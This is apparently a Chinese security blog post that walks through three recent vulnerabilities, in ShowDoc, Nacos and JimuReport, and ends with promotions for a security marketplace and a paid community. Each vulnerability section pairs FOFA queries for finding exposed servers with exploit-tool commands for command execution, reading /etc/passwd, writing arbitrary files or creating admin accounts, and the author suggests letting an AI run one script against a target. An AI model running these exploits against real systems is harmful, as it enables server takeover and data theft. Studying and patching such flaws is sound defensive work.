#  近期漏洞简单整理复现-showdoc/Nacos/JimuReport  
原创 陌笙
                    陌笙  陌笙不太懂安全   2026-09-18 09:33  
  
免责声明  
```
由于传播、利用本公众号所提供的信息而造成
的任何直接或者间接的后果及损失，均由使用
者本人负责，公众号陌笙不太懂安全及作者不
为此承担任何责任，一旦造成后果请自行承担！
如有侵权烦请告知，我们会立即删除并致歉，谢谢！
```  
# ShowDoc ≤ v3.9.2 RCE漏洞  
## 漏洞描述  
  
ShowDoc v3.9.2 及以下版本存在一个未授权远程代码执行（RCE）漏洞。该漏洞源于注册接口对   
username  
 参数缺乏严格的字符白名单校验，攻击者可在无需登录的情况下，将 PHP 代码写入默认位于 Web 根目录下的 SQLite 数据库文件（  
Sqlite/showdoc.db.php  
），随后通过直接访问该文件触发代码执行，从而完全控制服务器。  
## 漏洞核心原理  
  
该漏洞的利用依赖三个关键条件的叠加：  
1. **注入点：用户名过滤不严**  
注册接口   
/server/index.php?s=/api/user/registerByVerify  
 对   
username  
 参数仅执行了   
trim()  
 函数（去除首尾空白），  
**没有**  
进行字符类型或白名单校验。这意味着包含   
<?php  
 等 PHP 标签的任意字符串都能被作为用户名原样写入数据库。  
  
1. **落地点：数据库文件后缀为 .php**  
ShowDoc 默认使用 SQLite 存储数据，数据库文件路径为   
Sqlite/showdoc.db.php  
。该文件被设计为   
.php  
 后缀，原意是防止数据库文件被直接下载（Web 服务器会将   
.php  
 文件交由 PHP 解析器处理）。这意外地为攻击者提供了让恶意代码进入 PHP 词法扫描的通道。  
  
1. **触发点：直接访问数据库文件**  
攻击者通过   
GET /Sqlite/showdoc.db.php?cmd=你的命令  
 请求该文件。Web 服务器（如 Nginx）匹配到   
.php  
 后缀后，会将请求交给 PHP-FPM 解析。文件内的恶意用户名会被作为 PHP 代码执行。  
  
## 影响范围与修复  
  
影响版本：ShowDoc <= v3.9.2（默认 SQLite 部署，且注册功能开启）。  
  
修复版本：ShowDoc v3.9.3。官方在 3.9.3 版本中对 username 增加了严格的格式正则校验（仅允许字母、数字、下划线、横线、中文）。  
## 资产测绘  
```
fofa:
icon_hash=1969934080 || title="ShowDoc"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQhia1d42vic2kKfzpVMx1Fic2AQWjofc44Cs6OLz0NF6aahLLJJPXmukiaTSicJzrKvrqHv4S0OU16U6nBCJlWXjiagIK3zHjzdt2Lw/640?wx_fmt=png&from=appmsg "")  
## 漏洞复现  
  
确定资产  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboSXqHJfXmwibORoqTo8mHWXogQRSZia4mKlh4jSp77Z9wfrACvSFj7WwzdKciarHFO1yrHVW0I3273gnkIX0ibFHlGZpvibYK9nnmKI/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQHP3CqCKOwReBR8L3icV6yIXvlbCoKYF78xPo1kjV4c9A02dGMWiclkllY182LUs3YhtYED6OhcTnXAAv1qBthbbIP9BOicic63zY/640?wx_fmt=png&from=appmsg "")  
  
漏洞poc  
  
地址  
```
工具地址
https://github.com/Mr-xn/showdoc-registerbyverify-rce#1

工具用法
# 自动打码 (推荐): 双模型识别 + 失败自动换码重试
python3 exploit.py --url http://<target>:<port> --ocr --cmd id

# 手动验证码: 脚本下载验证码图片后输入, 或 --captcha 直接指定
python3 exploit.py --url http://<target>:<port> --captcha XXXX --cmd id

# 交互模式
python3 exploit.py --url http://<target>:<port> --ocr -i
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboS2QFRvmlrcLDwop3DzJENbDJns9nMHfQJiaCPHS7VrCsRibatgxichic09vcJicZxOBhovRFN1f4UAtk1MU1fsUoibeff2jibWbPBhp4/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboSn4Vibbq1AVtFUPp74wpOynI0ibMe7nqBia2o00DHrKthchtIJuNJicIpicS8DQicpbhCwSs1X56DgZXiavRpCWbxYB8auLAAVeiaJkJ0/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboT9OkVFTib5j06Vf2XX8yUib7YtMAvkRt0EgXO6gjHomKG4TbkoI9T7lGqrIsFfnGicnN9ibDZchMSibscpJltypQAB5LhwGkLdq0icI/640?wx_fmt=png&from=appmsg "")  
## 漏洞修复  
  
关闭注册功能：在数据库的 options 表中将 register_open 设置为 0。  
  
禁止访问数据库目录：在 Nginx 或相关 Web 服务器配置中，添加规则禁止访问 /Sqlite/ 目录或 *.db.php 文件。  
  
迁移数据库：将 SQLite 数据库文件移出 Web 根目录（例如移到 /data/ 目录下），或考虑切换为 MySQL 数据库。  
# Nacos 管理接口权限绕过漏洞  
## 漏洞描述  
  
该漏洞源于 Nacos 3.x 版本中 UserControllerV3.createUser() 等用户、角色、权限管理接口的 Secured 注解缺少 apiType 参数，而该参数默认值为 OPEN_API，导致这些本应受管理员鉴权保护的接口错误地落入由 AuthFilter 处理、且默认关闭（nacos.core.auth.enabled=false）的普通鉴权作用域，而非由 AuthAdminFilter 处理、默认开启（nacos.core.auth.admin.enabled=true）的 ADMIN_API 作用域，最终使攻击者可在未授权状态下直接调用这些管理接口创建高权限管理员账户，完全接管 Nacos 服务端。  
### 受影响接口  
<table><thead><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;"><th style="box-sizing: border-box;padding: 6px 13px;font-weight: bold;border-width: 1px 1px 0px;border-top-style: solid;border-right-style: solid;border-left-style: solid;border-top-color: rgb(223, 226, 229);border-right-color: rgb(223, 226, 229);border-left-color: rgb(223, 226, 229);border-image: initial;border-bottom-style: initial;border-bottom-color: initial;margin: 0px;text-align: left;"><span cid="n78" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 205.525px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">接口</span></span></span></th><th style="box-sizing: border-box;padding: 6px 13px;font-weight: bold;border-width: 1px 1px 0px;border-top-style: solid;border-right-style: solid;border-left-style: solid;border-top-color: rgb(223, 226, 229);border-right-color: rgb(223, 226, 229);border-left-color: rgb(223, 226, 229);border-image: initial;border-bottom-style: initial;border-bottom-color: initial;margin: 0px;text-align: left;"><span cid="n79" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 457.275px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">路径</span></span></span></th><th style="box-sizing: border-box;padding: 6px 13px;font-weight: bold;border-width: 1px 1px 0px;border-top-style: solid;border-right-style: solid;border-left-style: solid;border-top-color: rgb(223, 226, 229);border-right-color: rgb(223, 226, 229);border-left-color: rgb(223, 226, 229);border-image: initial;border-bottom-style: initial;border-bottom-color: initial;margin: 0px;text-align: left;"><span cid="n80" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 219.2px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">方法</span></span></span></th></tr></thead><tbody><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n82" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 205.525px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">创建/删除用户</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n83" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 457.275px;min-height: 10px;"><span md-inline="code" spellcheck="false" style="box-sizing: border-box;"><code style="box-sizing: border-box;font-family: var(--monospace);text-align: left;vertical-align: initial;border: 1px solid rgb(231, 234, 237);background-color: rgb(243, 244, 244);border-radius: 3px;padding: 0px 2px;font-size: 0.9em;"><span leaf="">/nacos/v3/auth/user</span></code></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n84" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 219.2px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">POST / DELETE</span></span></span></td></tr><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n86" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 205.525px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">创建/删除角色</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n87" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 457.275px;min-height: 10px;"><span md-inline="code" spellcheck="false" style="box-sizing: border-box;"><code style="box-sizing: border-box;font-family: var(--monospace);text-align: left;vertical-align: initial;border: 1px solid rgb(231, 234, 237);background-color: rgb(243, 244, 244);border-radius: 3px;padding: 0px 2px;font-size: 0.9em;"><span leaf="">/nacos/v3/auth/role</span></code></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n88" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 219.2px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">POST / DELETE</span></span></span></td></tr><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n90" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 205.525px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">创建/删除权限</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n91" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 457.275px;min-height: 10px;"><span md-inline="code" spellcheck="false" style="box-sizing: border-box;"><code style="box-sizing: border-box;font-family: var(--monospace);text-align: left;vertical-align: initial;border: 1px solid rgb(231, 234, 237);background-color: rgb(243, 244, 244);border-radius: 3px;padding: 0px 2px;font-size: 0.9em;"><span leaf="">/nacos/v3/auth/permission</span></code></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n92" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 219.2px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">POST / DELETE</span></span></span></td></tr></tbody></table>  
### 漏洞危害  
  
攻击者可在未授权状态下创建管理员账户，进而完全接管 Nacos 服务端，具体包括：  
- 窃取所有微服务配置信息（含数据库连接字符串、API 密钥等敏感凭证）  
  
- 修改配置导致业务中断  
  
- 创建后门账户实现持久化  
  
- 利用获取的凭证横向移动攻击企业内网其他系统  
  
## 影响范围  
### 3.1 受影响版本  
  
**3.0.0 <= Nacos <= 3.2.3**  
## 资产测绘  
```
FOFA语句:
app="nacos" && port="8848"
body="HTTP Status 404 – Not Found" && port="8848"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRYdS9O3n58QWSoVP0WHah2YOnZicb1tiaK60H8Aj4WSCZ8iaJCD01LVYYdTA8oIdPtia6ib1ft0h6oA1ibgEmyqNr46fVo04ManUgVI/640?wx_fmt=png&from=appmsg "")  
## 漏洞复现  
  
资产确定  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboTTszqASmbe8jTMAMqKm9qYMlmia75DwhyLyibZia4dZc7LySQEH40o2xYmjk1dZQQr4kD6MDzp1KjicAP44iaY84r9cHRy3xqvO0rg/640?wx_fmt=png&from=appmsg "")  
```
工具地址
https://github.com/TlyHj/nacos-v3-attack

工具用法
python3 poc.py                                # 默认打 127.0.0.1:8848
python3 poc.py --host 10.0.0.5 --port 8848
python3 poc.py --check-only                   # 只读探测，不写入
python3 poc.py --no-cleanup                   # 打完不删注入的账号
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboROQnHlPm6Rc31fg6xwt2jAA9GgE3ln7sRp0icPLScRI5mZD81YcYaGn3YrNlygztWBia53CxDFc2NUjbGbFuauVjAobSoGJj1Lg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQZww2LLdEgAG7kJgicZORS2gssvyCLHbkSVdVj7F50PPzbC1SiayRLsAb7F4aFldSbDEicdvzTd6PFh6VGoLKKQhM4HddhibGbyia4/640?wx_fmt=png&from=appmsg "")  
## 漏洞修复  
  
官方已在 Nacos 3.2.4 版本中修复此漏洞。修复方式为在受影响接口的 @Secured 注解中补上 apiType = ApiType.ADMIN_API。  
# JimuReport 2.5.1 未授权RCE漏洞  
## 漏洞描述  
  
该漏洞源于 JimuReport（积木报表）v2.5.1 自动导出功能在身份校验与表达式执行两方面存在安全缺陷的叠加。  
  
一方面，导出接口 /jmreport/auto/export/python/plugin 被设计为免登录访问，但其签名校验使用了硬编码的固定密钥。  
  
攻击者可直接利用该密钥伪造任意有效的 X-Sign 请求签名，完全绕过身份认证。  
  
另一方面，该接口在导出报表时会遍历请求中的查询参数值，并将其送入 Aviator 表达式引擎执行。代码未对以“=”开头的参数做任何过滤或白名单约束，攻击者可利用 Aviator 沙箱逃逸实现任意 Java 反射调用，最终在无任何凭据的情况下达成远程代码执行。  
## 漏洞影响  
  
影响版本： JimuReport = 2.5.1（且依赖的 Aviator 版本 < 5.4.4）。  
## 漏洞危害  
  
完全控制服务器：以应用权限执行任意系统命令，实现服务器沦陷。  
  
数据泄露：访问、修改或删除服务器上的敏感数据。  
  
持久性后门：在服务器上安装后门，以便未来随时访问。  
  
服务中断：破坏服务器正常运行，导致服务瘫痪。  
## 资产测绘  
```
FOFAy语法
icon_hash=1695246976 || title="欢迎使用积木报表"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTkk1fI5qVRgwPDdUD4u4ISwMFdwR18kvEvMpW2XhxO1YnCoMPdHKEibSBMNuFpIqLxksFfPaBMpx12Uzso6d4XcljQ4GCw9Q4o/640?wx_fmt=png&from=appmsg "")  
## 漏洞复现  
  
资产确定  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTrDrUSMvOibYaOCpicndwe3db2icdbDHEjBv7Q5Nsob6YQBIGlaxphNuen6U3UGH5o1WBUDEnrOdW0zupBt7jeyz7m8ccibjNHL6A/640?wx_fmt=png&from=appmsg "")  
  
漏洞复现  
  
这个漏洞如果不好复现，可以指定目标，让ai使用这个脚本来搞，或者改改脚本都可以。  
```
工具地址
https://github.com/mhtsec/jimureport-2.5.1-rce

工具使用

python3 exploit.py -t http://target:8085 -m exec -c 'id'      # RCE 执行命令并回显(默认 id)
python3 exploit.py -t http://target:8085 -m read -p /etc/passwd      # 任意文件读
python3 exploit.py -t http://target:8085 -m write -p /tmp/x -d hello # 任意文件写并读回验证
python3 exploit.py -t http://target:8085 -m probe                    # 环境探测
python3 exploit.py -t http://target:8085 -r <reportId> -k <param>    # 指定回显报表与参数名
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboTnvibvsPibTMKylzp0vaHQ6hSd4icia0mtAxCOftfSIqJ8MvqywbYIV5nHgOcrPGSgWL1Ihu2Rj2FlPibntlUCGaWTP1OPjKcbVT3k/640?wx_fmt=png&from=appmsg "")  
# 白帽集市简单介绍  
## 白帽集市：网安人的“海鲜市场”食用指南  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRHC3icUM6DB5c9VzJ4tXcWPcsjF7wtHV1xZRePOu5n3zNVQfNfekqYicBCr7Qfk5rKPxfQIrTg1TqL4JvsibL1yiajMYbc2NMejl4/640?wx_fmt=png&from=appmsg "")  
### 一、它是什么？为什么会出现？  
  
白帽集市是 FreeBuf 知识大陆 APP 内打造的一个  
**面向网络安全行业的垂直交易平台**  
，官方定位是“网安人自己的海鲜市场”。  
  
**它要解决的痛点很具体：**  
  
过去，白帽子们把工具、课程、AI Agent、技术资料和安服资源发到微信群、朋友圈甚至二手平台，原因很简单——  
**除了这些地方，几乎没有更好的选择**  
。  
  
但问题也很明显：  
- 真正有需求的买家很难找到匹配商品  
  
- 卖家也很难触达精准用户  
  
- 沟通靠私聊，交付靠信任  
  
- 既缺少展示机会，也缺少统一的服务保障  
  
官方的判断是：  
**不是网安行业没有需求，而是一直缺少一个真正属于网安人的“海鲜市场”。**  
  
所以白帽集市的目标很明确：让买家更容易找到商品，让卖家更容易找到用户，让每一位网安人的能力都能持续创造价值。  
### 二、卖家能做什么？可以卖什么？  
  
**与网络安全相关的数字商品和技术服务，都欢迎上架。**  
  
官方给出的品类包括：  
  
<table><thead><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;"><th style="box-sizing: border-box;padding: 6px 13px;font-weight: bold;border-width: 1px 1px 0px;border-top-style: solid;border-right-style: solid;border-left-style: solid;border-top-color: rgb(223, 226, 229);border-right-color: rgb(223, 226, 229);border-left-color: rgb(223, 226, 229);border-image: initial;border-bottom-style: initial;border-bottom-color: initial;margin: 0px;text-align: left;"><span cid="n236" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 167.438px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">品类</span></span></span></th><th style="box-sizing: border-box;padding: 6px 13px;font-weight: bold;border-width: 1px 1px 0px;border-top-style: solid;border-right-style: solid;border-left-style: solid;border-top-color: rgb(223, 226, 229);border-right-color: rgb(223, 226, 229);border-left-color: rgb(223, 226, 229);border-image: initial;border-bottom-style: initial;border-bottom-color: initial;margin: 0px;text-align: left;"><span cid="n237" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 741.562px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">具体例子</span></span></span></th></tr></thead><tbody><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n239" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 167.438px;min-height: 10px;"><span md-inline="strong" style="box-sizing: border-box;"><strong style="box-sizing: border-box;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">工具</span></span></strong></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n240" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 741.562px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">扫描器、插件、自动化脚本、开发工具</span></span></span></td></tr><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n242" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 167.438px;min-height: 10px;"><span md-inline="strong" style="box-sizing: border-box;"><strong style="box-sizing: border-box;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">知识资料</span></span></strong></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n243" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 741.562px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">漏洞分析、代码审计笔记、CTF Writeup、SRC 实战经验</span></span></span></td></tr><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n245" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 167.438px;min-height: 10px;"><span md-inline="strong" style="box-sizing: border-box;"><strong style="box-sizing: border-box;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">AI 相关</span></span></strong></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n246" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 741.562px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">AI 工具、安全 Agent、Prompt、自动化工作流</span></span></span></td></tr><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n248" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 167.438px;min-height: 10px;"><span md-inline="strong" style="box-sizing: border-box;"><strong style="box-sizing: border-box;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">技术资源</span></span></strong></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n249" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 741.562px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">PoC、规则库、字典、模板、指纹库</span></span></span></td></tr><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n251" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 167.438px;min-height: 10px;"><span md-inline="strong" style="box-sizing: border-box;"><strong style="box-sizing: border-box;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">课程与服务</span></span></strong></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n252" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 741.562px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">视频课程、安全咨询、应急响应、培训陪跑</span></span></span></td></tr></tbody></table>  
**卖家为什么选这里？**  
  
核心原因是  
**用户精准**  
。FreeBuf 知识大陆的用户本身就是白帽、安全工程师、安全团队和企业用户，卖家面对的不再是二手平台上形形色色的买家，而是真正有需求的目标用户。  
  
**费用方面：**  
- 平台服务费   
**0%**  
  
- 仅收   
**0.6%**  
 支付通道手续费  
  
- 提现无上限，每周可提现到账  
  
### 三、买家能做什么？  
  
买家主要是  
**有实战需求的白帽子、SRC 漏洞猎人、安全从业者**  
。  
  
**核心动作：**  
- **买工具提效**  
：扫描器、插件、自动化脚本等实战工具  
  
- **买知识资料**  
：漏洞分析、代码审计笔记、CTF Writeup、SRC 实战经验  
  
- **买 AI 工具与安全 Agent**  
：Prompt、自动化工作流等  
  
- **买技术资源**  
：PoC、规则库、字典、模板、指纹库  
  
- **买课程与服务**  
：视频课程、安全咨询、应急响应、培训陪跑  
  
- **看种草笔记再决定**  
：平台支持“种草笔记”和“种草电报”两种内容形式，都能挂载商品链接，买家可以先看推荐再下单  
  
### 四、平台有哪些扶持政策？  
  
**第一批卖家扶持计划：3 万元补贴**  
  
官方明确表示：“任何一个生态，都离不开第一批创业者。”所以准备了   
**3 万元扶持计划**  
。  
  
**流量扶持：**  
- 商品有机会进入平台推荐池  
  
- 获得首页推荐、品类专区曝光  
  
- 官方社群推荐、专题活动、直播推荐  
  
- FreeBuf 主站流量扶持  
  
**限时入驻福利：**  
- 平台服务费 0%，仅收 0.6% 支付通道手续费  
  
- 开店最高领取   
**100 元**  
红包  
  
- AI 工具最高享   
**10%**  
 销售补贴  
  
- 全店商品最高享   
**5%**  
 销售补贴  
  
- 3 万元补贴，先到先得  
  
### 五、怎么进入？怎么交易？  
- **手机端**  
：下载 FreeBuf 知识大陆 App，首页点击“店铺”即可进入  
  
- **PC 端**  
：登录网页后也有白帽集市入口  
  
- **内容带货**  
：上架后用「种草笔记」和「种草电报」发布内容，两种形式都能挂载商品链接，发布后商品自动进入平台推荐池  
  
### 六、白帽集市入口  
### https://wiki.freebuf.com/whitehatpage  
  
  
  
**后台回复加群加入交流群**  
  
****  
**广告：********cisp pte/pts &nisp1级2级低价报考**  
  
  
**陌笙安全纷传圈子+陌笙src挖掘知识库+陌笙安全漏洞库+陌笙安全面试题库**  
**简单介绍****（**  
**加入纷传圈子**  
**送****知识库+漏洞库+面试题库****）**  
                          
  
如果觉得合适可以加入,圈子目前价格  
39.9元，价格只会根据圈子内容和圈子人数进行上调，不会下跌。。。    
  
  
**圈子福利**  
   
  
**edu漏洞挖掘1v1指导出洞**  
  
****  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRKQWHxLsRrPqpqdiceX76d7yExQIyOqFmmJAfHQh7qzKvPc2V5z6iaa0RY6Ib8AsGvgS5MKkAk5aaHnJBaSnI10LDKQYMLcQMmg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboR8pnPeapLBK4Jsa4ufCvFoGL66t7PKeZyA3AjNxsObjtnCibN2gzGX7NMS7Wo5sj3YYL2iboeRuQDcWqiapc8xuo5fticoBG4DsyY/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRKIBNIQIVicRWJLbyGRmg92vPzc8375PJpcYVvfywzwqnaeBicZuEbfvuic9KRdjwkahSDic5VqrH2Mb4NkqtkADl5HLIh8gPex60/640?wx_fmt=png&from=appmsg "")  
  
**skill+grok辅助挖掘某企业sr**  
**c****实战效果，能出但是重复多。**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQwyn779TTwY7vZkePQCL8k3K8dYxNdyzfgADL4dJcNUvpmodLeDVCZ6xDC4RJXEBmO2tcWqgUNdTVicKTW0jpdsg7X6xwP5gIQ/640?wx_fmt=png&from=appmsg "")  
  
****  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQnIqagDL2A4BUIXrib9YVmATWuaIDqETqYd9ToHib52mDyoMyqc6Wzh733FRnbsDsGgey7B8s8jr72UtkPY6ich58niaPJqoItKcE/640?wx_fmt=png&from=appmsg "")  
  
****  
**企业src边缘&核心资产实战效果&&有重复但是证明好模型+AI确实够用**  
  
**（图片仅供参考，我出不等于你出，见识到ai神力即可，多去用AI!!!）**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboT1YNI9U6r6NMO4UMUBROoWeC4XQC4Dge94ODZ7tXY6tbxqb3IJoghve0u1SfkygE5UJ5HTdUBvLZKrn5ps13F71piax5dlHnOE/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTGjdxKy4nllaLXIznTvRqicichITccuB8psYFRYakw6ViauCk6iccziahfPw4fnrqhyCp7Zkq7lRI0DOicyrZlNyicYibTVibfGFZVaG0c/640?wx_fmt=png&from=appmsg "")  
  
****  
**陌笙src挖掘知识库介绍（内容持续更新中!!!)**  
```
信息收集(主域名信息收集,子域名信息收集等&会永久提供fofa-key助力)
弱口令漏洞&未授权访问漏洞挖掘
任意文件读取&删除&下载&上传漏洞
sql注入漏洞
url重定向漏洞
csrf&ssrf漏洞挖掘
XSS&XXE漏洞挖掘等等常见漏洞
cors&目录遍历&越权漏洞挖掘
EDUSRC(证书站挖掘案例分享&edusrc挖掘技巧分享)
CNVD挖掘技巧分享&实战案例报告编写
公益漏洞挖掘（公益src挖掘漏洞分享&提供补天1权重资产）
SRC挖掘实战(针对各种常见功能总结的常见测试思路等快速提升)
经典常见Nday漏洞(常见中间件&以及各种常见框架)复现
云安全相关漏洞挖掘（云key扫盲&云存储桶&快速识别云环境&云攻防）
AI相关学习（AI基础&AI代码审计实战测试&webLLM攻击等）
APP&小程序漏洞挖掘
等各模块不在一一介绍
```  
  
信息收集  
  
  
